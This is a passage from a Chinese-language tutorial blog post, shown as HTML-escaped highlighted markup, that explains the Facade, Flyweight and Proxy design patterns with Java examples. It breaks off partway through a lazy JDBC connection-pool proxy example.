&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n2&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getText&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// &amp;lt;b&amp;gt;&amp;lt;u&amp;gt;&amp;lt;span&amp;gt;Decorated&amp;lt;/span&amp;gt;&amp;lt;/u&amp;gt;&amp;lt;/b&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n3&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getText&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// &amp;lt;i&amp;gt;&amp;lt;b&amp;gt;&amp;lt;span&amp;gt;World&amp;lt;/span&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/i&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="门面外观facade">门面/外观Facade&lt;/h3>
&lt;p>终于到了经典的门面模式了（tomcat里真的到处都是门面模式），它的设计思想类似房屋中介&lt;/p>
&lt;p>举例：假设注册公司有三步：&lt;/p>
&lt;ol>
&lt;li>向工商局申请公司营业执照&lt;/li>
&lt;li>在银行开设账户&lt;/li>
&lt;li>在税务局开设纳税号&lt;/li>
&lt;/ol>
&lt;p>以下是三个系统的接口&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 工商注册:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">AdminOfIndustry&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Company&lt;/span> &lt;span style="color:#75af00">register&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 银行开户:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Bank&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">openAccount&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">companyId&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 纳税登记:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Taxation&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">applyTaxCode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">companyId&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">...&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果子系统比较复杂，并且客户对流程也不熟悉，那就把这些复杂流程全部委托给中介Facade&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Facade&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Company&lt;/span> &lt;span style="color:#75af00">openCompany&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Company&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">admin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">register&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">bankAccount&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">bank&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">openAccount&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getId&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setBankAccount&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">bankAccount&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">taxCode&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">taxation&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">applyTaxCode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getId&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setTaxCode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">taxCode&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这样客户端只跟Facade打交道即可&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Company&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">facade&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">openCompany&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Facade Software Ltd.&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在Web程序中随处可见Facade，内部有多个子系统提供服务，经常使用一个统一的Facade入口，比如&lt;code>RestApiController&lt;/code>，使得外部用户调用的时候，只关心Facade提供的接口，不管内部到底是哪个子系统处理的；复杂的web应用中经常有一个Gateway网关入口来转发不同的web服务或附加用户认证功能，本质也是一个Facade&lt;/p>
&lt;h3 id="享元flyweight">享元Flyweight&lt;/h3>
&lt;p>Flyweight的核心思想很简单：如果一个对象实例已经创建就不可变，那么反复创建一样的实例就没必要，直接返回一个共享的实例即可，减少创建对象过程的同时可以减少节省内存，提高运行速度，实现了不可变实例的复用&lt;/p>
&lt;p>与单例的区别在于不可变&lt;/p>
&lt;p>在java标准库中有很多应用，比如包装类型&lt;code>Byte&lt;/code>和&lt;code>Integer&lt;/code>都是不变类，因此反复创建同一个值相同的包装类型就没必要，以&lt;code>Integer&lt;/code>为例，用&lt;code>valueOf&lt;/code>这个静态工厂方法创建的实例（当传入int在(-128~+127)之间时）会直接返回缓存的&lt;code>Integer&lt;/code>实例&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">InterruptedException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">valueOf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n1&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">n2&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>对于&lt;code>Byte&lt;/code>来说，因为一共只有256个状态，所以通过&lt;code>Byte.valueOf()&lt;/code>创建的&lt;code>Byte&lt;/code>实例都是缓存对象&lt;/p>
&lt;p>在实际应用中，享元模式主要应用于缓存，即客户端如果重复请求某些对象，不必每次查询数据库或者读取文件，而是直接返回内存中缓存的数据（不用每次都new new new）&lt;/p>
&lt;p>举例：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 持有缓存
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">cache&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 静态工厂方法
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Student&lt;/span> &lt;span style="color:#75af00">create&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">id&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;\n&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 查找缓存
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Student&lt;/span> &lt;span style="color:#111">std&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">std&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 未找到创建新对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">formaet&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;create new Student (%s, %s)&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">std&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 放入缓存
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">cache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">std&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 缓存中存在
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">format&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;return cached Student (%s, %s)&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">std&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">std&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">std&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">id&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="代理proxy">代理Proxy&lt;/h3>
&lt;p>与适配器Adpater很相似，但不是将A接口转为B接口，它还是到A接口，只不过在包装的时候可以多加一些额外的代码&lt;/p>
&lt;p>举例：有A接口 其中实现了a方法，而AProxy类继承自A，其中的a方法可以增加鉴权，如果想要其它类型的代理只需要继续继承A即可&lt;/p>
&lt;h4 id="远程代理remote-proxy">远程代理Remote Proxy&lt;/h4>
&lt;p>比如我们经典的RMI(Remote Method Invocation)就是远程代理，本地调用者持有的接口实际是一个代理，这个代理负责把对接口的方法转换为远程调用&lt;/p>
&lt;h4 id="虚代理virtual-proxy">虚代理Virtual Proxy&lt;/h4>
&lt;p>让调用者先持有一个代理对象，但真正的对象尚未创建，如果没有必要这个真正的对象是不会被创建的，直到真正调用时才会创建，比如JDBC的连接池返回的JDBC连接（Connection对象）就是一个虚代理，即获取连接时根本没连上，直到第一次查询或更新操作时才会创建真正的JDBC连接&lt;/p>
&lt;h4 id="保护代理protection-proxy">保护代理Protection Proxy&lt;/h4>
&lt;p>用代理对象控制对原始对象的访问，常用于鉴权&lt;/p>
&lt;h4 id="智能引用smart-reference">智能引用Smart Reference&lt;/h4>
&lt;p>也是一种代理对象，如果有很多客户端对它进行访问，通过内部的计数器可以在外部调用者都不使用后自动释放它&lt;/p>
&lt;p>举例：用代理模式编写一个JDBC连接池（DataSource）&lt;/p>
&lt;p>首先写一个虚代理，即如果调用者获取到&lt;code>Connection&lt;/code>后，并没有执行任何SQL操作，那么这个Connection Proxy实际上并不会真正打开JDBC连接，调用者代码：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">DataSource&lt;/span> &lt;span style="color:#111">LazyDataSource&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">LazyDataSource&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">jdbcUrl&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">jdbcUsername&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">jdbcPassword&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;get lazy connection...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#111">conn1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">lazyDataSource&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConnection&lt;/span>&lt;span style="color:#f92672">()){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 没有打开连接
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;get lazy connection...&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Connection&lt;/span> &lt;span style="color:#111">conn2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">lazyDataSource&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getConnection&lt;/span>&lt;span style="color:#f92672">()){&lt;/span>
